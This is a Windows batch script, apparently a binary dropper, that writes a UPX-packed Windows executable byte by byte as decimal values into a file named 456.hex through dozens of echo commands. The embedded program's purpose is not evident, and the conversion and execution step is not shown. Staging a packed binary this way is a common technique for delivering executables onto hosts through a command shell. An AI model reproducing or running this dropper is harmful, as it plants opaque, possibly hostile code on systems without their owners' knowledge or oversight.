@echo off
echo|set /p=>456.hex
echo|set /p=77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 208 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 >>456.hex
echo|set /p=146 42 67 129 214 75 45 210 214 75 45 210 214 75 45 210 44 104 109 210 215 75 45 210 214 75 44 210 225 75 45 210 44 104 52 210 219 75 45 210 65 104 104 210 215 75 45 210 12 104 49 210 198 75 45 210 44 104 16 210 215 75 45 210 82 105 99 104 214 75 45 210 0 0 0 0 0 0 0 0 80 69 0 0 76 1 3 0 36 133 125 59 0 0 0 0 0 0 0 0 224 0 15 1 11 1 7 0 0 32 0 0 0 16 0 0 0 96 0 0 240 137 0 0 0 112 0 0 >>456.hex
echo|set /p=0 144 0 0 0 0 0 1 0 16 0 0 0 2 0 0 5 0 1 0 5 0 1 0 4 0 0 0 0 0 0 0 0 160 0 0 0 16 0 0 0 0 0 0 3 0 0 128 0 0 4 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 68 148 0 0 156 1 0 0 0 144 0 0 68 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 85 80 88 48 0 0 0 0 0 96 0 0 0 16 0 0 0 0 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 128 0 0 224 85 80 88 49 0 0 0 0 0 32 0 0 0 112 0 0 >>456.hex
echo|set /p=0 28 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 224 46 114 115 114 99 0 0 0 0 16 0 0 0 144 0 0 0 6 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 46 57 49 0 85 80 88 33 13 9 2 8 103 31 175 11 119 94 70 151 191 99 0 0 232 25 0 0 0 84 0 0 38 1 0 201 >>456.hex
echo|set /p=108 7 2 144 0 69 10 21 92 54 243 127 211 42 68 37 48 52 111 32 37 100 32 37 115 15 67 88 247 195 78 108 16 114 99 112 58 10 58 31 173 189 9 123 46 92 19 46 20 6 1 222 27 115 99 27 46 3 15 10 19 21 253 236 221 235 7 92 6 7 32 45 102 32 39 99 111 112 121 222 101 108 204 10 13 120 12 47 47 101 18 246 123 144 201 43 116 114 115 104 23 45 110 29 216 100 155 123 32 39 119 2 39 23 108 29 110 139 197 18 163 128 27 114 3 238 214 109 >>456.hex
echo|set /p=255 100 0 97 98 104 114 122 63 23 255 0 118 32 1 138 3 255 159 253 247 78 66 49 48 99 36 133 125 59 1 51 46 112 100 98 0 85 139 236 81 141 69 109 187 251 246 12 137 69 252 5 252 80 104 255 27 104 96 51 47 106 61 255 219 221 219 117 8 4 104 0 8 71 21 24 16 17 201 195 139 68 36 4 235 16 128 254 255 242 246 249 58 116 19 4 47 116 12 92 116 7 64 138 8 132 201 117 234 51 192 194 4 239 221 111 255 76 129 236 0 2 49 83 86 139 53 208 >>456.hex
echo|set /p=51 87 51 219 191 15 237 239 110 255 235 2 3 216 141 133 0 254 143 87 80 87 255 214 131 196 12 133 192 53 247 59 179 189 80 13 94 212 17 95 94 139 195 91 201 71 91 248 191 61 104 30 116 16 235 9 128 56 47 117 3 198 193 64 8 221 110 63 123 0 117 242 98 81 255 5 128 203 1 86 157 106 1 111 183 238 182 180 255 66 53 80 176 198 9 1 232 189 24 48 190 251 246 183 127 190 139 198 141 72 247 16 64 132 210 117 249 39 43 193 80 86 37 186 205 61 54 33 >>456.hex
echo|set /p=131 61 136 63 79 27 37 80 182 219 101 89 8 201 43 194 35 106 2 139 204 12 31 214 78 94 238 38 14 104 20 101 107 182 246 215 27 59 120 89 89 116 36 200 204 82 179 253 77 119 116 36 188 196 139 240 133 246 89 116 17 12 20 246 246 185 5 69 21 47 45 231 96 94 194 8 179 219 246 155 33 17 233 138 30 136 93 252 241 252 39 64 251 183 111 48 0 10 128 251 95 116 205 251 45 117 15 70 128 62 106 246 225 112 97 222 70 64 94 2 125 104 22 118 100 132 155 91 >>456.hex
echo|set /p=145 26 235 228 96 4 18 46 28 126 87 139 61 80 16 167 98 67 83 6 187 107 55 252 141 181 252 253 246 215 59 195 87 57 3 67 138 26 108 239 127 97 132 74 118 126 4 60 2 126 12 136 133 29 35 253 194 130 116 205 57 54 254 48 147 240 246 127 254 136 6 70 141 77 252 59 241 115 52 10 117 215 46 141 2 194 217 99 61 43 240 86 8 80 46 97 225 219 19 146 56 93 182 5 131 200 255 183 83 35 155 99 205 54 206 95 195 182 16 3 139 93 223 29 8 133 12 227 >>456.hex
echo|set /p=116 61 89 0 118 23 83 104 219 175 240 132 43 51 2 40 97 6 216 233 4 6 108 108 255 246 19 139 69 16 232 83 51 246 86 37 255 15 30 80 66 248 124 100 51 220 104 24 17 100 122 192 20 57 53 156 242 176 48 219 116 22 28 124 23 53 1 51 92 54 27 21 113 86 231 41 133 47 96 4 17 248 214 143 184 178 176 233 15 140 214 26 128 59 243 13 100 60 176 191 51 132 134 5 243 139 125 8 139 199 181 139 203 195 55 223 46 241 141 81 15 1 65 132 192 202 3 206 >>456.hex
echo|set /p=129 249 150 39 115 195 254 118 25 83 87 104 44 201 126 202 17 141 248 222 110 237 149 240 252 116 70 43 215 69 136 12 2 72 246 191 189 131 93 10 139 211 83 141 189 30 89 79 138 79 1 71 179 223 254 119 16 248 139 200 193 233 2 139 242 243 165 8 131 225 3 243 164 32 98 238 210 108 30 71 192 190 16 159 164 187 105 247 215 205 24 102 165 80 107 10 87 20 2 104 12 187 39 125 8 217 221 136 194 12 162 64 241 75 47 148 9 154 57 69 8 246 236 15 142 184 3 133 >>456.hex
echo|set /p=239 47 156 79 77 154 28 129 83 137 93 248 180 189 245 66 88 40 157 156 132 154 28 81 239 15 217 120 106 92 83 244 160 89 117 21 190 72 133 120 250 238 231 189 192 254 164 139 243 238 7 3 141 70 1 178 63 75 150 103 72 237 4 18 47 37 55 151 13 29 8 16 192 254 195 43 211 244 210 70 251 32 14 235 60 99 2 248 54 128 38 0 94 56 217 146 207 70 193 5 158 248 235 181 181 47 123 230 31 60 43 208 58 136 30 139 198 173 176 244 44 32 164 42 167 215 218 103 >>456.hex
echo|set /p=37 51 89 247 15 133 175 2 199 63 14 160 1 223 186 72 221 200 80 206 168 142 204 31 78 206 37 0 240 187 43 109 108 24 102 152 128 208 5 64 116 11 174 125 116 15 102 48 197 163 43 16 118 248 200 210 144 174 123 22 49 34 132 194 109 200 247 15 168 2 46 60 87 116 43 72 60 211 227 200 152 23 104 195 59 172 31 178 237 62 172 4 141 35 9 212 46 50 36 1 246 235 222 109 250 216 27 192 37 110 192 5 182 226 139 248 161 144 59 247 20 130 124 101 243 0 192 0 >>456.hex
echo|set /p=128 175 172 221 206 194 6 182 125 47 141 176 45 13 180 116 224 177 221 7 255 52 129 81 56 28 7 32 188 25 135 37 16 136 111 216 88 134 133 52 29 42 11 156 114 40 44 216 184 93 90 8 248 23 254 220 200 144 10 70 21 117 235 3 79 220 86 146 102 211 183 80 166 244 15 183 199 190 192 246 40 60 39 164 210 217 192 192 246 30 32 175 228 144 192 246 192 246 31 107 198 78 125 15 192 188 89 236 57 117 244 137 63 184 163 241 117 240 126 103 220 72 244 141 145 206 59 208 >>456.hex
echo|set /p=100 239 141 2 12 67 235 5 184 12 75 252 7 49 190 55 208 213 155 246 116 98 139 222 240 66 202 14 33 105 147 133 255 125 142 182 251 39 41 43 223 117 220 1 117 88 240 59 91 112 158 193 200 218 124 153 182 78 232 21 80 217 122 33 221 25 104 37 149 235 18 244 51 198 177 101 33 189 208 235 13 46 164 165 102 90 219 104 185 59 180 132 22 201 244 140 78 243 210 195 208 37 132 59 56 19 143 4 104 31 61 241 30 156 237 18 81 156 84 13 28 225 141 135 192 116 4 157 >>456.hex
echo|set /p=117 44 161 216 112 80 6 11 132 31 203 104 76 219 241 165 242 144 24 225 76 5 118 91 109 33 151 8 184 252 20 66 208 65 178 117 8 167 87 210 184 207 135 86 176 182 217 249 184 252 32 91 176 55 36 188 250 28 183 40 36 107 223 38 254 12 15 132 217 40 247 95 88 35 13 249 232 33 167 2 191 104 217 110 125 95 152 181 28 89 238 243 166 54 137 2 239 133 189 106 3 191 100 23 116 117 205 222 63 176 102 7 240 82 115 141 68 48 1 252 139 217 129 61 227 26 184 118 >>456.hex
echo|set /p=20 104 52 52 55 30 9 235 235 41 229 180 250 92 16 50 204 150 17 77 101 108 221 236 88 163 6 24 223 72 12 219 36 204 200 182 141 1 161 39 17 255 32 3 71 56 20 224 223 115 72 6 164 55 126 105 9 234 86 49 67 57 93 8 87 212 228 126 68 44 25 91 80 45 62 123 8 220 30 130 116 133 56 33 125 232 199 104 54 24 164 93 15 151 24 83 248 248 108 67 29 22 148 6 87 89 21 100 129 145 225 233 158 230 87 104 9 215 15 116 13 128 126 224 230 38 1 121 >>456.hex
echo|set /p=129 102 204 132 55 184 80 87 208 1 3 151 16 190 102 56 48 46 100 218 160 176 67 228 65 183 6 92 182 45 201 145 66 184 253 25 8 53 80 91 148 27 68 120 91 4 197 192 183 240 109 54 235 3 128 189 40 10 152 185 6 102 14 204 5 171 68 4 152 56 186 5 90 204 53 164 182 54 23 138 48 92 23 45 160 153 225 140 4 179 129 29 236 21 102 104 25 229 82 150 51 7 13 86 140 227 12 2 127 38 89 206 126 102 255 0 29 69 237 67 122 111 62 230 231 21 68 15 >>456.hex
echo|set /p=133 236 51 201 141 157 142 247 221 210 239 200 77 244 138 3 60 48 121 0 127 60 55 15 143 248 30 182 174 27 127 15 190 192 131 232 48 193 204 11 193 227 67 131 189 143 108 111 111 59 216 114 210 42 67 60 32 66 219 235 15 60 254 126 169 238 57 127 20 43 141 103 141 76 72 208 67 72 137 77 8 137 19 131 21 161 38 187 129 117 29 109 180 61 125 228 203 95 42 232 13 116 110 56 156 133 61 131 86 45 129 25 128 120 76 70 87 104 19 17 234 251 97 215 194 73 38 115 >>456.hex
echo|set /p=87 18 120 235 47 209 165 15 57 108 25 112 20 235 21 187 179 195 66 154 232 251 209 43 130 240 15 135 80 215 247 247 222 27 246 70 96 167 215 240 14 107 117 224 116 26 214 22 37 110 178 131 144 144 26 54 117 97 72 173 128 140 145 32 30 106 27 48 125 6 87 199 0 20 143 167 15 50 221 190 130 149 255 51 248 99 50 124 112 247 100 89 154 15 50 220 220 11 203 43 113 216 219 110 16 224 131 30 246 77 128 117 24 137 46 7 144 56 97 77 16 130 53 13 1 2 151 117 >>456.hex
echo|set /p=13 99 104 8 0 156 172 159 82 6 27 24 81 125 29 235 57 96 125 193 39 81 115 107 184 251 173 4 46 228 27 0 223 220 198 54 8 96 240 2 248 234 155 120 46 3 148 186 100 199 154 14 7 110 28 160 116 12 57 28 240 184 249 132 108 92 54 97 126 125 252 239 87 151 26 203 167 37 176 1 43 108 133 255 127 209 192 157 179 224 53 190 47 44 141 245 176 177 46 240 17 31 227 249 73 236 6 216 62 73 144 59 198 116 7 109 240 234 190 173 108 185 184 46 93 69 57 41 >>456.hex
echo|set /p=120 248 218 92 27 14 67 198 123 103 65 224 54 61 136 77 127 57 119 234 117 26 83 193 88 22 92 244 20 56 159 55 131 179 193 80 66 152 149 116 224 145 200 226 116 40 26 129 174 12 30 77 14 144 250 65 128 83 57 172 83 37 94 45 172 222 64 134 18 93 240 172 220 36 185 26 145 106 131 101 18 18 214 43 24 90 93 52 39 116 146 120 143 173 251 30 104 53 94 11 59 128 53 236 233 104 54 9 239 235 208 215 3 59 100 107 8 71 27 108 204 247 102 178 191 12 53 239 >>456.hex
echo|set /p=104 55 73 56 235 12 104 57 6 246 185 134 241 5 104 58 127 197 31 238 151 53 114 172 190 6 245 247 48 2 8 103 224 5 54 97 125 12 57 87 70 83 188 45 217 200 208 125 25 35 104 192 49 99 1 96 85 72 130 28 6 4 67 59 240 142 109 17 129 42 48 167 26 17 36 119 3 6 108 119 16 145 86 108 22 42 131 86 3 27 238 37 108 53 42 28 18 79 104 150 109 255 179 196 63 37 154 232 34 116 71 72 116 47 7 6 252 214 104 43 54 4 10 212 4 8 117 72 >>456.hex
echo|set /p=199 5 89 40 245 120 208 30 100 81 152 32 116 200 182 235 52 19 132 40 202 145 229 144 237 117 111 20 140 19 140 175 0 65 150 90 144 158 203 201 100 195 190 38 150 139 52 40 10 125 225 191 123 161 96 8 43 216 131 251 2 141 60 135 137 9 125 37 104 19 149 136 181 129 196 8 197 178 215 69 248 129 20 235 219 131 13 216 54 126 76 31 158 45 72 148 95 148 184 195 185 252 26 82 91 116 4 117 87 200 104 111 124 236 22 216 248 17 139 53 216 81 77 69 208 104 116 108 >>456.hex
echo|set /p=124 172 240 252 214 141 124 159 254 23 154 82 11 238 118 60 172 84 39 132 177 77 128 32 0 94 127 209 212 128 192 117 50 244 52 106 46 255 29 189 1 129 55 121 24 34 197 224 185 67 67 31 255 140 207 14 224 173 65 129 199 184 46 224 192 140 252 0 75 236 221 0 179 180 220 240 174 69 229 255 51 228 25 144 147 99 140 0 248 248 100 144 1 25 51 57 236 174 29 48 221 55 233 23 192 140 4 27 167 66 61 222 156 208 9 123 155 221 221 51 104 208 209 203 32 235 31 35 >>456.hex
echo|set /p=96 118 216 179 51 34 104 184 32 28 16 136 80 216 125 87 9 235 180 20 176 39 82 100 176 201 54 118 128 96 80 53 172 45 88 215 240 139 7 36 106 173 232 60 37 63 199 49 150 224 232 132 104 2 207 77 24 42 93 152 120 13 243 163 74 64 200 106 171 53 250 86 207 77 228 81 106 69 10 49 144 201 24 27 84 217 125 208 18 66 221 33 193 108 183 53 83 12 91 222 114 13 255 153 156 131 195 4 240 25 172 205 189 102 190 161 90 98 93 84 130 34 8 15 230 76 117 36 >>456.hex
echo|set /p=253 204 129 16 217 188 82 125 41 46 125 161 47 255 77 104 20 136 139 26 106 85 236 21 130 113 16 135 117 53 31 40 144 28 194 159 212 83 116 28 104 152 37 16 116 129 176 251 22 21 104 140 27 235 226 184 50 18 126 243 32 26 216 133 219 20 128 35 0 67 83 183 100 225 240 105 150 43 5 187 44 93 248 5 76 77 6 128 198 54 134 37 12 9 96 83 91 104 6 66 30 9 94 142 253 87 77 152 21 36 43 219 54 56 194 132 32 69 100 97 215 254 253 25 113 26 73 53 >>456.hex
echo|set /p=205 106 40 104 8 18 77 67 141 99 99 23 212 151 219 28 102 75 255 75 240 129 56 77 90 20 72 60 3 200 129 57 80 69 0 210 18 165 102 219 252 15 183 65 24 61 11 116 31 6 2 5 205 135 29 220 253 228 235 39 131 185 132 247 14 118 242 247 185 248 2 38 54 207 246 14 131 121 116 15 226 232 15 149 103 219 131 175 182 228 43 252 78 100 78 149 96 159 133 179 153 53 6 100 82 96 13 172 28 25 217 118 147 137 8 13 108 168 161 116 253 172 192 24 107 163 203 161 >>456.hex
echo|set /p=208 57 61 92 157 174 44 208 24 117 129 212 78 120 124 159 221 253 24 190 104 232 10 104 228 16 39 184 161 164 63 69 237 133 217 118 189 224 80 238 160 77 3 235 106 26 154 216 212 69 128 137 33 224 53 219 26 48 228 220 180 121 132 26 216 45 91 195 193 220 2 216 212 24 17 133 180 11 20 90 181 48 22 190 204 57 241 248 232 59 108 14 86 57 125 136 193 45 141 239 133 126 214 8 139 9 215 200 80 81 69 178 25 199 14 45 241 195 139 101 232 99 200 212 46 144 16 44 >>456.hex
echo|set /p=209 56 15 144 148 160 125 198 145 237 193 63 175 13 195 204 255 37 231 5 140 205 181 40 188 124 138 46 174 4 31 219 91 193 125 34 30 73 69 39 104 40 40 17 100 21 232 253 197 161 0 196 100 137 37 7 41 134 216 108 91 85 108 3 141 43 224 197 170 53 108 27 163 137 116 80 230 199 2 217 26 208 241 75 185 195 253 47 13 54 178 125 226 89 20 81 195 107 104 112 5 124 133 3 51 48 170 83 88 182 194 51 222 10 94 235 25 87 61 71 95 187 33 205 193 191 106 12 >>456.hex
echo|set /p=200 52 182 209 230 126 2 6 46 208 171 16 163 186 215 139 209 244 138 31 232 255 116 210 186 93 194 16 235 104 149 174 26 80 234 248 143 122 252 204 214 227 5 252 46 53 176 226 187 41 24 84 95 80 147 2 201 195 169 91 97 32 129 220 95 108 117 225 172 140 64 36 60 12 8 80 179 53 103 226 172 135 13 32 25 8 22 94 81 32 91 89 25 80 236 65 75 21 204 76 81 74 99 61 49 43 173 157 170 60 50 32 231 98 236 34 60 93 24 2 131 6 124 208 166 150 59 252 >>456.hex
echo|set /p=92 219 138 221 114 112 53 180 13 124 8 194 233 46 183 94 88 162 13 182 92 86 139 4 179 0 45 87 255 110 227 176 116 21 11 26 100 37 139 124 36 24 3 193 138 15 223 66 55 110 182 138 16 157 58 202 110 71 12 117 55 90 106 225 245 128 63 48 24 236 194 35 208 7 183 250 63 33 63 88 235 116 128 127 1 58 117 76 18 64 65 155 141 221 20 29 16 70 137 127 137 81 104 107 198 126 91 174 163 133 117 27 63 209 81 62 64 194 94 22 156 235 181 51 37 130 205 170 >>456.hex
echo|set /p=253 20 20 172 226 46 246 144 100 6 255 11 72 95 91 94 42 91 3 145 248 24 137 2 141 77 170 81 36 117 214 36 81 102 227 176 3 72 14 7 52 8 108 5 128 58 13 249 255 159 162 64 40 35 41 32 67 111 112 121 114 105 103 104 116 32 40 99 239 254 255 127 49 57 56 51 32 84 104 101 32 82 101 103 101 110 116 115 32 111 102 32 116 14 85 110 105 118 254 219 255 253 101 114 115 105 116 121 17 67 97 108 105 102 111 114 19 97 46 10 32 65 108 108 32 208 182 118 >>456.hex
echo|set /p=247 64 44 114 101 115 36 39 100 21 64 133 193 123 32 3 40 72 8 202 22 3 211 28 5 20 3 1 178 89 54 77 26 40 208 7 216 56 9 110 139 154 229 16 39 60 36 174 68 37 174 235 254 255 37 0 49 0 160 0 58 0 32 0 84 0 76 0 79 1 75 11 97 15 247 155 249 255 114 0 101 0 110 0 118 0 111 0 121 0 233 41 50 0 33 0 100 3 155 9 106 55 9 48 0 62 173 67 52 230 62 55 33 69 53 55 117 5 81 87 205 18 118 73 57 53 37 215 >>456.hex
echo|set /p=117 11 117 201 0 99 128 101 5 32 25 117 111 3 115 93 115 115 0 111 100 123 103 23 99 110 172 235 154 60 68 131 108 27 105 47 39 161 51 221 123 231 116 0 116 5 19 31 112 69 230 102 178 110 115 9 46 59 56 116 0 95 9 155 194 186 111 1 107 219 49 161 93 51 214 108 55 64 76 89 114 115 9 97 93 215 117 99 165 101 11 116 7 104 59 114 11 45 76 214 117 99 27 114 75 105 203 101 63 84 172 217 76 215 86 35 117 177 110 234 169 221 235 206 94 13 167 32 >>456.hex
echo|set /p=27 110 247 7 112 111 51 221 123 67 17 171 105 3 115 225 9 91 178 9 73 205 159 1 97 198 198 78 8 9 108 221 99 49 105 154 238 123 17 69 25 187 116 29 98 101 240 206 102 201 17 123 179 101 57 222 91 217 144 107 108 99 55 39 216 97 217 235 97 116 19 77 145 101 205 85 246 18 23 107 72 80 55 193 13 96 35 32 197 215 15 135 25 179 199 105 15 15 101 173 231 62 51 97 71 148 11 65 125 69 100 111 37 188 79 185 1 33 117 103 3 108 161 41 82 9 100 151 >>456.hex
echo|set /p=5 132 207 123 23 99 87 1 68 198 99 217 8 11 233 245 3 1 109 3 195 77 36 147 87 11 109 13 216 128 141 213 115 185 40 35 108 230 154 45 133 37 39 92 73 25 173 33 97 194 200 111 105 109 255 108 198 151 140 117 67 167 98 19 155 22 172 27 155 99 191 110 11 120 203 93 210 246 146 113 96 231 93 63 116 143 178 100 204 88 215 7 203 50 126 90 210 5 117 106 0 224 185 144 77 210 22 19 160 73 72 187 73 24 123 8 149 113 19 116 227 157 5 108 144 116 80 27 >>456.hex
echo|set /p=147 44 235 186 89 35 141 244 7 123 116 73 97 71 91 246 21 172 103 83 125 44 223 35 178 199 108 8 51 219 97 115 164 89 135 102 112 67 43 105 255 158 27 233 222 161 19 99 116 209 125 49 186 17 30 85 97 13 99 225 109 113 189 83 178 177 120 45 116 51 159 117 39 36 155 241 57 232 133 109 43 80 143 36 77 36 233 103 149 89 43 97 72 99 215 251 59 164 64 118 76 79 31 112 79 147 192 108 194 81 85 77 109 117 239 43 97 77 23 82 223 31 112 41 128 48 97 103 >>456.hex
echo|set /p=39 181 193 214 77 210 55 155 114 65 46 21 76 53 16 56 35 54 103 37 85 61 125 179 151 202 6 144 107 89 195 182 172 110 123 19 11 112 45 114 255 127 192 82 217 20 67 55 143 56 144 18 56 64 19 179 203 90 72 75 45 41 163 13 133 112 8 135 168 59 97 177 143 36 141 75 99 15 121 109 169 241 150 148 132 111 187 223 233 145 125 167 37 13 187 233 78 51 32 11 3 44 229 119 160 32 156 222 16 105 15 219 135 189 101 205 80 96 77 57 5 39 185 133 36 201 131 102 >>456.hex
echo|set /p=15 223 39 61 189 8 99 57 39 153 89 147 102 14 164 16 214 3 233 143 47 76 97 206 18 246 143 253 133 99 93 18 179 38 199 251 197 118 74 46 139 141 233 105 143 75 116 56 76 154 176 105 153 189 12 158 94 73 239 39 35 109 247 201 158 146 197 35 171 233 21 76 96 66 186 97 115 114 136 35 8 99 19 72 191 114 109 117 105 26 225 4 2 237 104 69 100 25 188 89 192 111 101 55 63 18 198 119 104 163 33 44 11 5 2 59 18 167 140 135 173 236 4 38 95 185 105 137 >>456.hex
echo|set /p=160 100 34 59 109 139 116 33 3 100 111 109 85 115 120 118 34 36 13 39 29 43 117 149 77 90 1 31 115 172 37 180 189 227 11 105 187 189 20 137 9 155 67 95 79 195 195 40 100 241 121 61 149 27 119 97 137 144 92 93 73 225 17 66 6 178 91 112 34 16 62 38 39 237 117 163 58 17 74 98 152 27 1 19 18 19 122 147 114 145 29 110 246 182 100 117 51 109 187 133 118 29 255 9 47 73 83 115 219 175 43 57 11 33 117 39 229 151 156 74 100 179 174 114 183 112 193 163 >>456.hex
echo|set /p=147 197 217 194 221 161 224 25 102 45 97 216 51 97 181 41 100 201 226 123 183 53 105 161 33 32 144 172 119 98 243 97 31 120 241 222 108 155 153 223 255 188 1 179 62 81 107 231 69 40 0 83 128 45 220 178 95 69 1 209 65 116 194 168 251 3 86 11 41 211 76 10 247 102 239 157 35 67 57 189 133 175 205 110 118 246 128 29 211 115 239 37 135 100 147 189 117 207 179 118 29 83 195 72 18 95 33 100 11 67 217 199 164 67 21 227 65 110 235 59 181 16 96 181 239 137 179 36 >>456.hex
echo|set /p=244 96 80 155 143 17 186 135 2 108 15 91 227 79 124 3 45 100 178 193 26 25 93 19 104 9 114 174 251 120 192 19 171 93 11 46 115 189 119 112 103 99 58 15 37 145 107 235 206 96 145 41 87 116 33 92 245 201 150 241 222 37 213 249 159 99 42 155 108 153 32 1 83 39 144 88 9 33 239 75 144 104 232 174 65 61 67 193 73 183 43 25 43 105 101 115 255 99 9 35 176 217 153 1 241 112 193 2 169 27 77 8 95 146 218 73 76 63 21 116 71 36 14 239 44 51 104 53 >>456.hex
echo|set /p=21 35 205 197 33 193 109 85 253 175 22 97 9 169 88 127 151 99 150 187 200 107 47 183 19 171 99 9 60 224 101 41 85 51 132 101 49 97 67 43 43 111 16 22 97 9 145 155 2 103 197 14 112 147 171 102 33 33 151 241 34 205 27 98 119 86 175 80 255 237 103 233 200 129 165 172 55 139 104 214 99 217 0 84 99 5 19 38 120 143 80 51 17 227 172 85 114 96 105 114 117 217 18 224 165 77 231 245 203 152 37 99 83 135 101 7 38 76 128 45 61 11 105 74 133 116 24 181 >>456.hex
echo|set /p=59 3 120 111 129 116 195 235 23 91 176 101 116 120 109 234 131 37 127 48 172 37 36 7 97 88 18 92 133 253 39 77 120 239 212 140 87 201 247 143 54 54 9 28 131 77 46 67 105 55 235 173 164 82 119 221 29 49 131 55 10 231 175 52 52 77 8 181 73 99 44 157 118 144 248 50 147 100 133 122 21 18 86 72 132 117 49 42 164 129 192 135 47 56 194 150 197 19 105 32 26 73 140 132 39 177 16 78 122 156 223 211 117 117 45 11 6 96 161 129 137 6 203 146 53 217 253 161 >>456.hex
echo|set /p=32 45 194 22 253 159 37 36 233 91 215 99 103 105 25 194 42 131 225 105 28 122 208 2 55 149 99 12 54 25 21 108 59 102 43 117 35 132 66 72 27 151 49 10 105 2 183 179 16 174 164 129 237 19 85 229 72 165 50 152 122 233 167 9 16 251 96 101 112 185 229 164 134 161 176 151 40 83 32 27 247 186 73 111 34 5 179 91 41 99 159 217 144 176 172 203 73 115 199 140 25 15 74 169 21 183 45 194 102 9 69 159 48 78 116 129 253 106 153 55 222 40 97 194 143 99 119 72 >>456.hex
echo|set /p=72 45 137 227 51 78 239 165 164 19 201 95 85 64 155 185 140 207 24 253 107 133 236 50 154 231 157 84 79 44 248 6 32 89 35 110 13 1 3 70 44 5 100 164 33 49 155 19 87 79 109 45 11 73 223 99 114 129 199 222 155 241 234 41 211 235 19 199 101 151 37 33 33 183 92 99 74 122 35 12 115 233 107 13 177 87 182 172 94 109 95 91 116 150 144 43 51 87 160 13 49 8 223 99 183 169 103 177 114 54 97 147 150 205 131 217 244 113 26 129 189 20 207 115 204 88 217 140 >>456.hex
echo|set /p=129 213 3 10 100 178 101 57 91 132 101 19 88 86 195 149 99 36 70 86 111 125 163 163 228 132 17 198 191 175 104 49 27 25 169 17 33 24 100 75 120 15 83 149 203 18 217 132 143 235 99 36 1 22 97 239 127 1 214 178 9 197 237 75 2 97 75 138 23 139 201 97 139 50 75 115 40 38 196 192 2 39 183 155 117 154 194 43 87 249 195 123 214 9 164 172 83 173 191 238 121 29 222 178 32 191 23 43 40 123 43 155 7 159 119 115 192 138 129 108 100 117 233 21 86 205 65 216 >>456.hex
echo|set /p=119 148 71 233 108 8 52 54 70 101 101 93 89 75 141 176 232 105 139 43 98 162 3 139 38 139 108 8 36 197 72 221 211 147 157 17 39 151 153 233 147 156 32 33 66 36 179 68 114 4 88 155 160 2 144 50 42 231 37 177 44 14 3 109 189 165 77 132 189 37 115 63 161 128 166 4 10 145 159 11 101 1 66 38 200 127 188 232 80 78 162 115 179 102 215 8 129 172 203 37 115 1 219 77 16 194 85 132 59 83 239 196 100 93 171 68 143 112 201 5 88 146 232 0 19 193 131 50 >>456.hex
echo|set /p=17 114 81 71 92 102 239 49 80 99 209 25 127 100 178 37 232 117 65 105 76 91 96 44 97 68 162 105 95 94 33 161 3 60 183 235 101 205 46 132 193 116 253 15 183 178 67 168 61 64 59 63 57 140 82 73 50 131 48 33 220 101 41 193 97 59 25 108 73 192 151 125 235 23 171 209 227 16 11 199 237 61 224 97 100 31 167 102 165 164 144 51 67 147 71 80 79 189 18 2 39 133 119 99 157 55 144 53 115 201 96 79 133 0 83 9 89 111 105 217 236 123 111 7 25 241 108 49 >>456.hex
echo|set /p=247 205 222 200 82 95 183 165 9 51 2 19 97 97 235 74 170 64 50 88 163 51 174 236 80 141 97 115 113 189 20 50 97 87 92 37 30 146 196 149 67 97 247 67 233 96 229 64 10 121 105 91 225 8 12 115 52 87 46 143 18 106 66 41 15 33 44 122 152 148 209 125 99 251 1 68 232 14 39 203 92 13 133 165 176 149 35 239 97 1 2 140 176 91 97 72 40 65 54 128 91 243 65 118 128 45 221 88 127 25 64 178 34 249 43 16 42 57 75 87 96 192 60 52 233 245 147 187 >>456.hex
